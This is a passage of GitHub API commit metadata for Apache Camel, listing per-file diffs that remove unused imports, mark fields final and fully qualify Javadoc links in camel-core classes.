                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/ServiceSupport.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 4,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/ServiceSupport.java",
                "patch": "@@ -33,10 +33,10 @@\n  */\n public abstract class ServiceSupport implements Service {\n     private static int threadCounter;\n-    private AtomicBoolean started = new AtomicBoolean(false);\n-    private AtomicBoolean starting = new AtomicBoolean(false);\n-    private AtomicBoolean stopping = new AtomicBoolean(false);\n-    private AtomicBoolean stopped = new AtomicBoolean(false);\n+    private final AtomicBoolean started = new AtomicBoolean(false);\n+    private final AtomicBoolean starting = new AtomicBoolean(false);\n+    private final AtomicBoolean stopping = new AtomicBoolean(false);\n+    private final AtomicBoolean stopped = new AtomicBoolean(false);\n     private Collection childServices;\n     private String version;\n ",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/impl/ServiceSupport.java",
                "sha": "6fa4baae90ba1c0a93307e05ab3c37d3832816e8",
                "status": "modified"
            },
            {
                "additions": 0,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/management/CamelNamingStrategy.java",
                "changes": 1,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/management/CamelNamingStrategy.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/management/CamelNamingStrategy.java",
                "patch": "@@ -25,7 +25,6 @@\n import org.apache.camel.CamelContext;\n import org.apache.camel.Consumer;\n import org.apache.camel.Endpoint;\n-import org.apache.camel.Exchange;\n import org.apache.camel.Route;\n import org.apache.camel.Service;\n import org.apache.camel.model.ProcessorDefinition;",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/management/CamelNamingStrategy.java",
                "sha": "5de778727bed71967f737d14ba8e4df7b1028d5d",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/management/InstrumentationLifecycleStrategy.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/management/InstrumentationLifecycleStrategy.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/management/InstrumentationLifecycleStrategy.java",
                "patch": "@@ -56,7 +56,7 @@\n \n     // A map (Endpoint -> InstrumentationProcessor) to facilitate\n     // adding per-route interceptor and registering ManagedRoute MBean\n-    private Map<Endpoint, InstrumentationProcessor> interceptorMap =\n+    private final Map<Endpoint, InstrumentationProcessor> interceptorMap =\n         new HashMap<Endpoint, InstrumentationProcessor>();\n \n     public InstrumentationLifecycleStrategy() {",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/management/InstrumentationLifecycleStrategy.java",
                "sha": "0a2b0f022c753b883b7701902bfcb20cb7850679",
                "status": "modified"
            },
            {
                "additions": 10,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/model/Constants.java",
                "changes": 17,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/model/Constants.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 7,
                "filename": "camel-core/src/main/java/org/apache/camel/model/Constants.java",
                "patch": "@@ -20,14 +20,17 @@\n  * @version $Revision: 1.1 $\n  */\n public final class Constants {\n-    public static final String JAXB_CONTEXT_PACKAGES = \n-        \"org.apache.camel:\" + \n-        \"org.apache.camel.model:\" + \n-        \"org.apache.camel.model.config:\" + \n-        \"org.apache.camel.model.dataformat:\" + \n-        \"org.apache.camel.model.language:\" + \n-        \"org.apache.camel.model.loadbalancer\";\n+\n+    public static final String JAXB_CONTEXT_PACKAGES = \"\"\n+        + \"org.apache.camel:\"\n+        + \"org.apache.camel.model:\"\n+        + \"org.apache.camel.model.config:\"\n+        + \"org.apache.camel.model.dataformat:\"\n+        + \"org.apache.camel.model.language:\"\n+        + \"org.apache.camel.model.loadbalancer\";\n+\n \n     private Constants() {\n     }\n+\n }",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/model/Constants.java",
                "sha": "1eebd4ec26dbb0966c5a5391420d61e6adcc1635",
                "status": "modified"
            },
            {
                "additions": 0,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/model/InterceptDefinition.java",
                "changes": 1,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/model/InterceptDefinition.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/model/InterceptDefinition.java",
                "patch": "@@ -20,7 +20,6 @@\n import java.util.List;\n import javax.xml.bind.annotation.XmlAccessType;\n import javax.xml.bind.annotation.XmlAccessorType;\n-import javax.xml.bind.annotation.XmlElement;\n import javax.xml.bind.annotation.XmlRootElement;\n import javax.xml.bind.annotation.XmlTransient;\n ",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/model/InterceptDefinition.java",
                "sha": "91bcd50fe2486bc012b44a1871e6cbdfe631e856",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/model/ProcessorDefinition.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/model/ProcessorDefinition.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 2,
                "filename": "camel-core/src/main/java/org/apache/camel/model/ProcessorDefinition.java",
                "patch": "@@ -52,7 +52,6 @@\n import org.apache.camel.model.language.ExpressionDefinition;\n import org.apache.camel.model.language.LanguageExpression;\n import org.apache.camel.processor.DelegateProcessor;\n-import org.apache.camel.processor.Enricher;\n import org.apache.camel.processor.Pipeline;\n import org.apache.camel.processor.aggregate.AggregationCollection;\n import org.apache.camel.processor.aggregate.AggregationStrategy;\n@@ -1709,7 +1708,7 @@ public Type sort(Expression expression) {\n      *            aggregation strategy to aggregate input data and additional\n      *            data.\n      * @return this processor type\n-     * @see Enricher\n+     * @see org.apache.camel.processor.Enricher\n      */\n     @SuppressWarnings(\"unchecked\")\n     public Type enrich(String resourceUri, AggregationStrategy aggregationStrategy) {",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/model/ProcessorDefinition.java",
                "sha": "db1f52ea5c48b119c55fb51d3bfa22f45c5450fe",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/model/dataformat/CsvDataFormat.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/model/dataformat/CsvDataFormat.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 3,
                "filename": "camel-core/src/main/java/org/apache/camel/model/dataformat/CsvDataFormat.java",
                "patch": "@@ -20,10 +20,8 @@\n import javax.xml.bind.annotation.XmlAccessorType;\n import javax.xml.bind.annotation.XmlRootElement;\n \n-import org.apache.camel.spi.DataFormat;\n-\n /**\n- * Represents a CSV (Comma Separated Values) {@link DataFormat}\n+ * Represents a CSV (Comma Separated Values) {@link org.apache.camel.spi.DataFormat}\n  *\n  * @version $Revision$\n  */",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/model/dataformat/CsvDataFormat.java",
                "sha": "4756f1c1001acefbc8d31261f1521ba1e3b595a5",
                "status": "modified"
            },
            {
                "additions": 0,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/model/dataformat/FlatpackDataFormat.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/model/dataformat/FlatpackDataFormat.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 2,
                "filename": "camel-core/src/main/java/org/apache/camel/model/dataformat/FlatpackDataFormat.java",
                "patch": "@@ -20,8 +20,6 @@\n import javax.xml.bind.annotation.XmlAccessorType;\n import javax.xml.bind.annotation.XmlRootElement;\n \n-import org.apache.camel.spi.DataFormat;\n-\n /**\n  * Represents a <a href=\"http://camel.apache.org/flatpack.html\">Flatpack</a> {@link org.apache.camel.spi.DataFormat}.\n  * ",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/model/dataformat/FlatpackDataFormat.java",
                "sha": "3e5c6d4ffbe4a992d02ef9412ba03d00ef9052e8",
                "status": "modified"
            },
            {
                "additions": 0,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/model/dataformat/HL7DataFormat.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/model/dataformat/HL7DataFormat.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 2,
                "filename": "camel-core/src/main/java/org/apache/camel/model/dataformat/HL7DataFormat.java",
                "patch": "@@ -20,8 +20,6 @@\n import javax.xml.bind.annotation.XmlAccessorType;\n import javax.xml.bind.annotation.XmlRootElement;\n \n-import org.apache.camel.spi.DataFormat;\n-\n /**\n  * Represents a <a href=\"http://camel.apache.org/hl7.html\">HL7</a> {@link org.apache.camel.spi.DataFormat}.\n  *",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/model/dataformat/HL7DataFormat.java",
                "sha": "00bb0907d98f895cd675e8af11ab065907a719b0",
                "status": "modified"
            },
            {
                "additions": 0,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/model/dataformat/RssDataFormat.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/model/dataformat/RssDataFormat.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 3,
                "filename": "camel-core/src/main/java/org/apache/camel/model/dataformat/RssDataFormat.java",
                "patch": "@@ -20,11 +20,8 @@\n import javax.xml.bind.annotation.XmlAccessorType;\n import javax.xml.bind.annotation.XmlRootElement;\n \n-import org.apache.camel.spi.DataFormat;\n-\n /**\n  * Represents a <a href=\"http://camel.apache.org/rss.html\">RSS</a> {@link org.apache.camel.spi.DataFormat}.\n- *\n  */\n @XmlRootElement(name = \"rss\")\n @XmlAccessorType(XmlAccessType.FIELD)",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/model/dataformat/RssDataFormat.java",
                "sha": "c48f036d1d97c878c5a1d3184745c6bfa53cc802",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/model/dataformat/XStreamDataFormat.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/model/dataformat/XStreamDataFormat.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 3,
                "filename": "camel-core/src/main/java/org/apache/camel/model/dataformat/XStreamDataFormat.java",
                "patch": "@@ -21,10 +21,8 @@\n import javax.xml.bind.annotation.XmlAttribute;\n import javax.xml.bind.annotation.XmlRootElement;\n \n-import org.apache.camel.spi.DataFormat;\n-\n /**\n- * Represents the XStream XML {@link DataFormat}\n+ * Represents the XStream XML {@link org.apache.camel.spi.DataFormat}\n  *\n  * @version $Revision$\n  */",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/model/dataformat/XStreamDataFormat.java",
                "sha": "23990381a2d61e0bc2290ee97fd8329bcb4420fb",
                "status": "modified"
            },
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/model/dataformat/ZipDataFormat.java",
                "changes": 5,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/model/dataformat/ZipDataFormat.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 2,
                "filename": "camel-core/src/main/java/org/apache/camel/model/dataformat/ZipDataFormat.java",
                "patch": "@@ -14,10 +14,8 @@\n  * See the License for the specific language governing permissions and\n  * limitations under the License.\n  */\n-\n package org.apache.camel.model.dataformat;\n \n-\n import java.util.zip.Deflater;\n \n import javax.xml.bind.annotation.XmlAccessType;\n@@ -28,6 +26,9 @@\n import org.apache.camel.spi.DataFormat;\n import org.apache.camel.spi.RouteContext;\n \n+/**\n+ * Represents the ZIP XML {@link org.apache.camel.spi.DataFormat}\n+ */\n @XmlRootElement(name = \"zip\")\n @XmlAccessorType(XmlAccessType.FIELD)\n public class ZipDataFormat extends DataFormatDefinition {",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/model/dataformat/ZipDataFormat.java",
                "sha": "bd55a20245269080ac892d4449dfc7e0beb3c4fd",
                "status": "modified"
            },
            {
                "additions": 0,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/model/language/MethodCallExpression.java",
                "changes": 1,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/model/language/MethodCallExpression.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/model/language/MethodCallExpression.java",
                "patch": "@@ -21,7 +21,6 @@\n import javax.xml.bind.annotation.XmlAttribute;\n import javax.xml.bind.annotation.XmlRootElement;\n \n-import org.apache.camel.Exchange;\n import org.apache.camel.Expression;\n import org.apache.camel.Predicate;\n import org.apache.camel.language.bean.BeanExpression;",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/model/language/MethodCallExpression.java",
                "sha": "779b1d9209c156e05da20d4c4d31cfa486bf2692",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/model/loadbalancer/LoadBalancerDefinition.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/model/loadbalancer/LoadBalancerDefinition.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 2,
                "filename": "camel-core/src/main/java/org/apache/camel/model/loadbalancer/LoadBalancerDefinition.java",
                "patch": "@@ -76,8 +76,7 @@ protected void setProperty(Object bean, String name, Object value) {\n         try {\n             IntrospectionSupport.setProperty(bean, name, value);\n         } catch (Exception e) {\n-            throw new IllegalArgumentException(\"Failed to set property \" + \n-                name + \" on \" + bean + \". Reason: \" + e, e);\n+            throw new IllegalArgumentException(\"Failed to set property \" + name + \" on \" + bean + \". Reason: \" + e, e);\n         }\n     }\n ",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/model/loadbalancer/LoadBalancerDefinition.java",
                "sha": "ebea4f358eb6234c0e4ac7516a36c5c8e1e758ad",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/processor/DelegateAsyncProcessor.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/processor/DelegateAsyncProcessor.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 2,
                "filename": "camel-core/src/main/java/org/apache/camel/processor/DelegateAsyncProcessor.java",
                "patch": "@@ -20,13 +20,12 @@\n import org.apache.camel.AsyncProcessor;\n import org.apache.camel.Exchange;\n import org.apache.camel.impl.ServiceSupport;\n-import org.apache.camel.spi.Policy;\n import org.apache.camel.util.AsyncProcessorHelper;\n import org.apache.camel.util.ServiceHelper;\n \n /**\n  * A Delegate pattern which delegates processing to a nested AsyncProcessor which can\n- * be useful for implementation inheritance when writing an {@link Policy}\n+ * be useful for implementation inheritance when writing an {@link org.apache.camel.spi.Policy}\n  */\n public class DelegateAsyncProcessor extends ServiceSupport implements AsyncProcessor {\n     protected AsyncProcessor processor;",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/processor/DelegateAsyncProcessor.java",
                "sha": "d4ea61c8cc5cedebc2c2db7989e326c5dc145947",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/processor/DelegateProcessor.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/processor/DelegateProcessor.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 2,
                "filename": "camel-core/src/main/java/org/apache/camel/processor/DelegateProcessor.java",
                "patch": "@@ -19,12 +19,11 @@\n import org.apache.camel.Exchange;\n import org.apache.camel.Processor;\n import org.apache.camel.impl.ServiceSupport;\n-import org.apache.camel.spi.Policy;\n import org.apache.camel.util.ServiceHelper;\n \n /**\n  * A Delegate pattern which delegates processing to a nested processor which can\n- * be useful for implementation inheritance when writing an {@link Policy}\n+ * be useful for implementation inheritance when writing an {@link org.apache.camel.spi.Policy}\n  * \n  * @version $Revision$\n  */",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/processor/DelegateProcessor.java",
                "sha": "00f20dab3b604d2c3b2eb5f2afe8651c0348e327",
                "status": "modified"
            },
            {
                "additions": 0,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/processor/ExchangePatternProcessor.java",
                "changes": 1,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/processor/ExchangePatternProcessor.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/processor/ExchangePatternProcessor.java",
                "patch": "@@ -20,7 +20,6 @@\n import org.apache.camel.AsyncProcessor;\n import org.apache.camel.Exchange;\n import org.apache.camel.ExchangePattern;\n-import org.apache.camel.Processor;\n \n public class ExchangePatternProcessor implements AsyncProcessor {\n     private ExchangePattern exchangePattern = ExchangePattern.InOnly;",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/processor/ExchangePatternProcessor.java",
                "sha": "fd7f4eaf05a2b4a35945c33ee4a56e6295c51a02",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/processor/aggregate/DefaultAggregationCollection.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/processor/aggregate/DefaultAggregationCollection.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 2,
                "filename": "camel-core/src/main/java/org/apache/camel/processor/aggregate/DefaultAggregationCollection.java",
                "patch": "@@ -17,7 +17,6 @@\n package org.apache.camel.processor.aggregate;\n \n import java.util.AbstractCollection;\n-import java.util.Collection;\n import java.util.Iterator;\n import java.util.LinkedHashMap;\n import java.util.Map;\n@@ -28,7 +27,7 @@\n import org.apache.commons.logging.LogFactory;\n \n /**\n- * A {@link Collection} which aggregates exchanges together using a correlation\n+ * A {@link java.util.Collection} which aggregates exchanges together using a correlation\n  * expression so that there is only a single message exchange sent for a single\n  * correlation key.\n  *",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/processor/aggregate/DefaultAggregationCollection.java",
                "sha": "73acdb78237018531520ac7d825bd1845902bad8",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/processor/interceptor/StreamCachingInterceptor.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/processor/interceptor/StreamCachingInterceptor.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/processor/interceptor/StreamCachingInterceptor.java",
                "patch": "@@ -24,8 +24,8 @@\n import org.apache.camel.NoTypeConversionAvailableException;\n import org.apache.camel.Processor;\n import org.apache.camel.StreamCache;\n-import org.apache.camel.model.InterceptorRef;\n import org.apache.camel.model.InterceptorDefinition;\n+import org.apache.camel.model.InterceptorRef;\n import org.apache.camel.processor.DelegateProcessor;\n import org.apache.camel.util.AsyncProcessorHelper;\n import org.apache.camel.util.MessageHelper;",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/processor/interceptor/StreamCachingInterceptor.java",
                "sha": "58d9499794899f6c71d1b862019ad16f0c7ef6ac",
                "status": "modified"
            },
            {
                "additions": 0,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/processor/loadbalancer/LoadBalancerConsumer.java",
                "changes": 1,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/processor/loadbalancer/LoadBalancerConsumer.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/processor/loadbalancer/LoadBalancerConsumer.java",
                "patch": "@@ -17,7 +17,6 @@\n package org.apache.camel.processor.loadbalancer;\n \n import org.apache.camel.Endpoint;\n-import org.apache.camel.Exchange;\n import org.apache.camel.Processor;\n import org.apache.camel.impl.DefaultConsumer;\n ",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/processor/loadbalancer/LoadBalancerConsumer.java",
                "sha": "a7f61c5bb212ff38ee916aefabdc4fa35b507b18",
                "status": "modified"
            },
            {
                "additions": 5,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/util/CamelContextHelper.java",
                "changes": 13,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/util/CamelContextHelper.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 8,
                "filename": "camel-core/src/main/java/org/apache/camel/util/CamelContextHelper.java",
                "patch": "@@ -24,10 +24,7 @@\n import org.apache.camel.Endpoint;\n import org.apache.camel.Expression;\n import org.apache.camel.NoSuchEndpointException;\n-import org.apache.camel.impl.DefaultCamelContext;\n-import org.apache.camel.spi.Injector;\n import org.apache.camel.spi.Language;\n-import org.apache.camel.spi.Registry;\n \n import static org.apache.camel.util.ObjectHelper.isEmpty;\n import static org.apache.camel.util.ObjectHelper.isNotEmpty;\n@@ -129,31 +126,31 @@ public static Endpoint getMandatoryEndpoint(CamelContext camelContext, String ur\n     }\n \n     /**\n-     * Creates a new instance of the given type using the {@link Injector} on the given\n+     * Creates a new instance of the given type using the {@link org.apache.camel.spi.Injector} on the given\n      * {@link CamelContext}\n      */\n     public static <T> T newInstance(CamelContext context, Class<T> beanType) {\n         return context.getInjector().newInstance(beanType);\n     }\n \n     /**\n-     * Look up the given named bean in the {@link Registry} on the\n+     * Look up the given named bean in the {@link org.apache.camel.spi.Registry} on the\n      * {@link CamelContext}\n      */\n     public static Object lookup(CamelContext context, String name) {\n         return context.getRegistry().lookup(name);\n     }\n \n     /**\n-     * Look up the given named bean of the given type in the {@link Registry} on the\n+     * Look up the given named bean of the given type in the {@link org.apache.camel.spi.Registry} on the\n      * {@link CamelContext}\n      */\n     public static <T> T lookup(CamelContext context, String name, Class<T> beanType) {\n         return context.getRegistry().lookup(name, beanType);\n     }\n \n     /**\n-     * Look up the given named bean in the {@link Registry} on the\n+     * Look up the given named bean in the {@link org.apache.camel.spi.Registry} on the\n      * {@link CamelContext} or throws IllegalArgumentException if not found.\n      */\n     public static Object mandatoryLookup(CamelContext context, String name) {\n@@ -163,7 +160,7 @@ public static Object mandatoryLookup(CamelContext context, String name) {\n     }\n \n     /**\n-     * Look up the given named bean of the given type in the {@link Registry} on the\n+     * Look up the given named bean of the given type in the {@link org.apache.camel.spi.Registry} on the\n      * {@link CamelContext} or throws IllegalArgumentException if not found.\n      */\n     public static <T> T mandatoryLookup(CamelContext context, String name, Class<T> beanType) {",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/util/CamelContextHelper.java",
                "sha": "f1113b445a01ef136d6a176594be64acee1f7652",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/util/CollectionStringBuffer.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/util/CollectionStringBuffer.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/util/CollectionStringBuffer.java",
                "patch": "@@ -22,7 +22,7 @@\n  * @version $Revision$\n  */\n public class CollectionStringBuffer {\n-    private StringBuffer buffer = new StringBuffer();\n+    private final StringBuffer buffer = new StringBuffer();\n     private String separator;\n     private boolean first = true;\n ",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/util/CollectionStringBuffer.java",
                "sha": "dba0fc3c35b1483fd1fd6c2a60f276e7cea5397a",
                "status": "modified"
            },
            {
                "additions": 0,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/util/URISupport.java",
                "changes": 1,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/util/URISupport.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/util/URISupport.java",
                "patch": "@@ -24,7 +24,6 @@\n import java.util.ArrayList;\n import java.util.Collections;\n import java.util.HashMap;\n-import java.util.Iterator;\n import java.util.Map;\n \n /**",
                "raw_url": "https://github.com/apache/camel/raw/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/util/URISupport.java",
                "sha": "8f10a006d387b04ff50b10b014361fb4e84811ac",
                "status": "modified"
            },
            {
                "additions": 0,
                "blob_url": "https://github.com/apache/camel/blob/8aea5df11af7e51bd1ed2c0eb24a9543056e015f/camel-core/src/main/java/org/apache/camel/util/UuidGenerator.java",
                "changes": 1,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/util/UuidGenerator.java?ref=8aea5df11af7e51bd1ed2c0eb24a9543056e015f",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/util/UuidGenerator.java",
                "patch": "@@ -18,7 +18,6 @@\n \n import java.net.InetAddress;\n import java.net.ServerSocket;\n-import java.util.logging.Level;\n \n import org.apache.commons.logging.Log;\n import org.apache.commons.logging.LogFactory;",
